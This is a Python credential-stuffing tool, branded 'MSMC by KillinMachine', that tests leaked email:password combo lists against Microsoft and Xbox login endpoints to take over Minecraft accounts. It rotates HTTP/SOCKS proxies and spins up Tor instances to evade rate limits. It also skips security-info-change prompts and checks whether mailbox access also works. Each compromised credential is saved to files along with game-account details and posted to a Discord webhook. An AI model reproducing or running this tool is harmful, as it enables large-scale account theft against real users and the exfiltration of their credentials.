import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, subprocess, tarfile, traceback
from time import gmtime, strftime
from colorama import Fore
from stem import Signal
from stem.control import Controller
from console import utils
from tkinter import filedialog

logo = Fore.GREEN+'''
     ███▄ ▄███▓  ██████  ███▄ ▄███▓ ▄████▄  
    ▓██▒▀█▀ ██▒▒██    ▒ ▓██▒▀█▀ ██▒▒██▀ ▀█  
    ▓██    ▓██░░ ▓██▄   ▓██    ▓██░▒▓█    ▄ 
    ▒██    ▒██   ▒   ██▒▒██    ▒██ ▒▓▓▄ ▄██▒
    ▒██▒   ░██▒▒██████▒▒▒██▒   ░██▒▒ ▓███▀ ░
    ░ ▒░   ░  ░▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░ ░▒ ▒  ░
    ░  ░      ░░ ░▒  ░ ░░  ░      ░  ░  ▒   
    ░      ░   ░  ░  ░  ░      ░   ░        
           ░         ░         ░   ░ ░      
                                   ░        \n'''
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000004C12AE6F" \
             "&redirect_uri=https://login.live.com/oauth20_desktop.srf" \
             "&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
day = strftime("%Y-%m-%d-%H-%M-%S", gmtime())
hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries = 0,0,0,0,0,0,0,0,0,0,0,0
urllib3.disable_warnings()

class Capture:
    def notify(email, password, name, hypixel, level, firstlogin, lastlogin, cape, capes, access, sbcoins):
        global errors
        try:
            payload = {
                "content": webhook_message
                    .replace("<email>", email)
                    .replace("<password>", password)
                    .replace("<name>", name)
                    .replace("<hypixel>", hypixel)
                    .replace("<level>", level)
                    .replace("<firstlogin>", firstlogin)
                    .replace("<lastlogin>", lastlogin)
                    .replace("<ofcape>", cape)
                    .replace("<capes>", capes)
                    .replace("<access>", access)
                    .replace("<skyblockcoins>", sbcoins),
                "username": "MSMC"
            }
            requests.post(webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"})
        except: errors+=1

    def hypixel(name):
        global errors
        try:
            oname = None
            olevel = None
            ofirstlogin = None
            olastlogin = None
            osbcoins = None
            tx = requests.get('https://plancke.io/hypixel/player/stats/'+name, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
            try: oname = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
            except: _=''
            try: olevel = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
            except: _=''
            try: ofirstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
            except: _=''
            try: olastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
            except: _=''
            try:
                req = requests.get("https://sky.shiiyu.moe/stats/"+name, verify=False) #didnt use the api here because this is faster ¯\_(ツ)_/¯
                osbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
            except: errors+=1
            return oname, olevel, ofirstlogin, olastlogin, osbcoins
        except: errors+=1

    def optifine(name):
        try:
            txt = requests.get(f'http://s.optifine.net/capes/{name}.png', verify=False).text
            if "Not found" in txt: return "No"
            else: return "Yes"
        except: return "Unknown"

    def full_access(email, password):
        global errors
        try:
            out = requests.get(f"https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={email}&Password={password}", headers={"User-Agent":"MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0"}, verify=False).text
            if "Ok=1" in out: return True
        except: errors+=1
        return False
    
    def handle(mc, email, password, capes):
        global hits, mfa, sfa, cpm, checked
        if screen == "'2'": print(Fore.GREEN+f"Hit: {mc} | {email}:{password}")
        hits+=1
        with open(f"results/{day}/Hits.txt", 'a') as file: file.write(f"{email}:{password}\n")
        oname, olevel, ofirstlogin, olastlogin, osbcoins = Capture.hypixel(mc)
        cape = Capture.optifine(mc)
        access = "SFA"
        if Capture.full_access(email, password): 
            access = "FULL ACCESS"
            mfa+=1
            cpm+=1
            checked+=1
            open(f"results/{day}/MFA.txt", 'a').write(f"{email}:{password}\n")
        else: 
            open(f"results/{day}/SFA.txt", 'a').write(f"{email}:{password}\n")
            sfa+=1
            cpm+=1
            checked+=1
        with open(f"results/{day}/Capture.txt", 'a') as file:
            file.write(f'''Name: {mc}
Email: {email}
Password: {password}
Hypixel: {oname}
Level: {olevel}
First Login: {ofirstlogin}
Last Login: {olastlogin}
Skyblock Coins: {osbcoins}
Optifine Cape: {cape}
MC Capes: {capes}
Access: {access}
=======================\n''')
        Capture.notify(email, password, mc, oname, olevel, ofirstlogin, olastlogin, cape, capes, access, osbcoins)

def get_urlPost_sFTTag(session):
    r = session.get(sFTTag_url, timeout=15)
    text = r.text
    match = re.match(r'.*value="(.+?)".*', text, re.S)
    if match is not None:
        sFTTag = match.group(1)
        match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
        if match is not None:
            return match.group(1), sFTTag
        else: return get_urlPost_sFTTag(session)
    else: return get_urlPost_sFTTag(session)

def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
    global bad, checked, cpm, twofa, retries, checked
    try:
        data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
        login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
        if '#' in login_request.url and login_request.url != sFTTag_url:
            token = None
            for item in login_request.url.split("#")[1].split("&"):
                key, value = item.split("=")
                if key == 'access_token':
                    token = requests.utils.unquote(value)
                    break
            return token
        #sec info change
        elif 'cancel?mkt=' in login_request.text:
            data = {'ipt':re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(), 'pprid':re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(), 'uaid':re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()}
            ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
            fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
            if '#' in fin.url and fin.url != sFTTag_url:
                token = None
                for item in fin.url.split("#")[1].split("&"):
                    key, value = item.split("=")
                    if key == 'access_token':
                        token = requests.utils.unquote(value)
                        break
                return token
        elif "tried to sign in too many times with an incorrect account or password." in login_request.text:
            retries+=1
            tries+=1
            if proxytype == "'4'": renew_tor(session.proxies.get('http').split(':')[2])
            session.proxy = getproxy()
            if tries < maxretries:
                #if screen == "'2'": print(Fore.LIGHTRED_EX+f"Blocked, retrying: {email}:{password} {Fore.LIGHTBLACK_EX}[{str(tries)}/{str(maxretries)}]")
                return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
            else:
                bad+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                return None
        #2fa
        elif any(value in login_request.text for value in ["recover?mkt" , "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
            twofa+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
            with open(f"results/{day}/2fa.txt", 'a') as file: file.write(f"{email}:{password}\n")
            return None
        #bad
        elif any(value in login_request.text for value in ["Your account or password is incorrect." , "That Microsoft account doesn't exist. Enter a different account" , "Sign in to your Microsoft account" ]):
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
            return None
        #blocked, retry
        else:
            retries+=1
            tries+=1
            if proxytype == "'4'": renew_tor(session.proxies.get('http').split(':')[2])
            session.proxy = getproxy()
            if tries < maxretries: return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
            else:
                bad+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                return None
    except:
        retries+=1
        tries+=1
        if tries < maxretries: return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
        else:
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
            return None

def authenticate(email, password):
    global vm, bad, retries, checked, cpm
    try:
        proxy = getproxy()
        session = requests.Session()
        session.verify = False
        session.proxies = proxy
        token = get_xbox_rps(session, email, password, *get_urlPost_sFTTag(session))
        if token is not None:
            xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
            js = xbox_login.json()
            xbox_token = js.get('Token')
            if xbox_token is not None:
                uhs = js['DisplayClaims']['xui'][0]['uhs']
                xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xsts.json()
                xsts_token = js.get('Token')
                if xsts_token is not None:
                    mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
                    access_token = mc_login.json().get('access_token')
                    if access_token is not None:
                        mc, capes = account(access_token, session)
                        if mc != None:
                            Capture.handle(mc, email, password, capes)
                        else:
                            if screen == "'2'": print(Fore.GREEN+f"Valid Mail: {email}:{password}")
                            vm+=1
                            cpm+=1
                            checked+=1
                            with open(f"results/{day}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
                    else:
                        bad+=1
                        cpm+=1
                        checked+=1
                        if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                else:
                    bad+=1
                    cpm+=1
                    checked+=1
                    if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
            else:
                bad+=1
                cpm+=1
                checked+=1
                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    except Exception as e:
        #print(e)
        #traceback.print_exc()
        #line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
        #print("Exception occurred at line:", line_number)
        if proxytype == "'4'": renew_tor(session.proxies.get('http').split(':')[2])
        retries+=1
        authenticate(email, password)

def account(access_token, session):
    r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False)
    capes = ""
    if r.status_code == 200:
        try:
            capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
        except: capes = "Unknown"
        return r.json()['name'], capes
    else:
        error+=1
        return "Unknown Name.", "Unknown Capes."

def Load():
    global Combos
    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if filename is None:
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        Load()
    else:
        try:
            with open(filename.name, 'r+', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                print(Fore.LIGHTBLUE_EX+f"[{str(len(lines) - len(Combos))}] Dupes Removed.")
                print(Fore.LIGHTBLUE_EX+f"[{len(Combos)}] Combos Loaded.")
        except:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            time.sleep(2)
            Load()

def Proxys():
    global proxylist
    fileNameProxy = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameProxy is None:
        print()
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        Proxys()
    else:
        try:
            with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        proxylist.append(proxyline)
                    except: pass
            print(Fore.LIGHTBLUE_EX+f"Loaded [{len(proxylist)}] lines.")
            time.sleep(2)
        except Exception:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            time.sleep(2)
            Proxys()

def logscreen():
    global cpm, cpm1
    cmp1 = cpm
    cpm = 0
    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Valid Mail: {vm}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=logscreen, args=()).start()    

def cuiscreen():
    global cpm, cpm1
    os.system('cls')
    cmp1 = cpm
    cpm = 0
    print(logo)
    print(f" [{checked}\{len(Combos)}] Checked")
    print(f" [{hits}] Hits")
    print(f" [{bad}] Bad")
    print(f" [{sfa}] SFA")
    print(f" [{mfa}] MFA")
    print(f" [{twofa}] 2FA")
    print(f" [{vm}] Valid Mail")
    print(f" [{retries}] Retries")
    print(f" [{errors}] Errors")
    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Valid Mail: {vm}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=cuiscreen, args=()).start()

def finishedscreen():
    #os.system('cls')
    print(logo)
    print()
    print(Fore.LIGHTGREEN_EX+"Finished Checking!")
    print()
    print("Hits: "+str(hits))
    print("Bad: "+str(bad))
    print("SFA: "+str(sfa))
    print("MFA: "+str(mfa))
    print("2FA: "+str(twofa))
    print("Valid Mail: "+str(vm))
    print(Fore.LIGHTRED_EX+"Press any key to exit.")
    repr(readchar.readkey())
    os.abort()

def renew_tor(port):
    with Controller.from_port(port) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)
        time.sleep(controller.get_newnym_wait())

def getproxy():
    if proxytype != "'5'": 
        proxy = random.choice(proxylist)
        if proxytype  == "'1'": return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype  == "'2'": return {'http': 'socks4://'+proxy,'https': 'socks4://'+proxy}
        elif proxytype  == "'3'" or proxytype  == "'4'": return {'http': 'socks5://'+proxy,'https': 'socks5://'+proxy}
    else: return None

def Checker(combo):
    global bad, checked, cpm
    try:
        email, password = combo.replace('\n', '').replace(' ', '').split(":")
        if email != "" and password != "":
            authenticate(str(email), str(password))
        else:
            if screen == "'2'": print(Fore.RED+f"Bad: {combo}")
            bad+=1
            cpm+=1
            checked+=1
    except:
        if screen == "'2'": print(Fore.RED+f"Bad: {combo}")
        bad+=1
        cpm+=1
        checked+=1

def loadconfig():
    global webhook, maxretries, webhook_message
    if not os.path.isfile("config.ini"):
        config = configparser.ConfigParser(allow_no_value=True)
        config['Settings'] = {
            'HitWebhook': 'paste your discord webhook here',
            'MaxRetries': '5',
            'WebhookMessage': '''@everyone HIT: ||`<email>:<password>`||
Name: <name>
Hypixel: <hypixel>
Level: <level>
First Login: <firstlogin>
Last Login: <lastlogin>
Optifine Cape: <ofcape>
MC Capes: <capes>
Access: <access>
Skyblock Coins: <skyblockcoins>'''}
        with open('config.ini', 'w') as configfile:
            config.write(configfile)
    read_file = configparser.ConfigParser()
    read_file.read('config.ini')
    webhook = str(read_file['Settings']['HitWebhook'])
    maxretries = int(read_file['Settings']['MaxRetries'])
    webhook_message = str(read_file['Settings']['WebhookMessage'])

def checkandinstalltor(toramount):
    global proxylist
    if not os.path.exists("tor/tor.exe"):
        print(Fore.YELLOW+"Tor is not installed. Downloading now.")
        req = requests.get("https://www.torproject.org/download/tor/", verify=False)
        downloadlink = re.search(r'(?<=<td>Windows \(x86_64\) </td>\n          <td>\n            \n  \n  \n  \n\n  <a class=\"downloadLink\" href=\").+?(?=\">)', req.text).group()
        torfilename = "tor.tar.gz"
        response = requests.get(downloadlink, stream=True)
        if response.status_code == 200:
            with open(torfilename, 'wb') as f:
                for chunk in response.iter_content(chunk_size=128):
                    f.write(chunk)
            print(f"File '{torfilename}' downloaded successfully.")
            with tarfile.open(torfilename, 'r:gz') as tar:
                tar.extractall()
        else:
            print(f"Failed to download the file. Status code: {response.status_code}")
        os.remove(torfilename)
        print("Downloaded Tor successfully.")
    if not os.path.exists("tor/data"):
        os.makedirs("tor/data")
    print(Fore.LIGHTYELLOW_EX+"Starting Tor Proxies. Please Wait.")
    for i in range(int(toramount)):
        socks_port = 9050 + i
        subprocess.Popen([
            os.path.join(os.getcwd(), r"tor\tor.exe"),
            '--SocksPort', str(socks_port),
            '--ControlPort', str(9051 + i)
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        proxylist.append("127.0.0.1:"+str(socks_port))

def Main():
    global proxytype, screen
    utils.set_title("MSMC by KillinMachine")
    os.system('cls')
    try:
        loadconfig()
    except:
        print(Fore.RED+"There was an error loading the config. Perhaps you're using an older config? If so please delete the old config and reopen MSMC.")
        input()
        exit()
    print(logo)
    try:
        print(Fore.LIGHTBLACK_EX+"(speed for checking, i recommend 100, give more threads if its slow. if you're using tor for proxies give it at least 1000 threads.)")
        thread = int(input(Fore.LIGHTBLUE_EX+"Threads: "))
    except:
        print(Fore.LIGHTRED_EX+"Must be a number.") 
        time.sleep(2)
        Main()
    print(Fore.LIGHTBLUE_EX+f"Proxy Type: [1] Http\s - [2] Socks4 - [3] Socks5 - [4] Tor {Fore.LIGHTBLACK_EX}[not stable]{Fore.LIGHTBLUE_EX} - [5] None")
    proxytype = repr(readchar.readkey())
    if proxytype =="'4'":
        try:
            print(Fore.LIGHTBLACK_EX+f"(amount of tor proxies, i suggest {str(thread//10)}.)")
            toramt = int(input(Fore.LIGHTBLUE_EX+"Tor Proxies: "))
            checkandinstalltor(toramt)
        except:
            print(Fore.LIGHTRED_EX+"Must be a number.") 
            time.sleep(5)
            Main()
    print(Fore.LIGHTBLUE_EX+"Screen: [1] CUI - [2] Log")
    screen = repr(readchar.readkey())
    print(Fore.LIGHTBLUE_EX+"Select your combos")
    Load()
    if proxytype != "'4'" and proxytype != "'5'":
        print(Fore.LIGHTBLUE_EX+"Select your proxies")
        Proxys()
    if not os.path.exists("results"): os.makedirs("results/")
    if not os.path.exists('results/'+day): os.makedirs('results/'+day)
    if screen == "'1'": cuiscreen()
    elif screen == "'2'": logscreen()
    else: cuiscreen()
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        futures = [executor.submit(Checker, combo) for combo in Combos]
        concurrent.futures.wait(futures)
    finishedscreen()
    input()
Main()
